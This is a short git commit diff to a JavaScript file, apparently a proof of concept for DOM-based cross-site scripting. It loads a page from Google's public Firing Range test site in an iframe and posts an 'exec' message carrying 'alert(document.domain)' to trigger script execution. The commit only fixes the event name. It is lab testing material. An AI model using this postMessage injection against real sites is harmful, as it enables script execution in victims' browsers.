f915468425c171822dc8b12c117a062cf1dffc82
TrveHooman <110975382+TrveHooman@users.noreply.github.com>
2025-12-24 13:41:44 +0330

    Update script.js

--- script.js
+++ script.js
@@ -1,5 +1,5 @@
 var frame = document.getElementById("frame");
-frame.addEventListener(load, () => {
+frame.addEventListener('load', () => {
     frame.contentWindow.postMessage({'action':'exec', 'payload':'alert(document.domain)'},"*")
 });
 frame.src = "https://public-firing-range.appspot.com/dom/toxicdom/postMessage/complexMessageDocumentWriteEval";
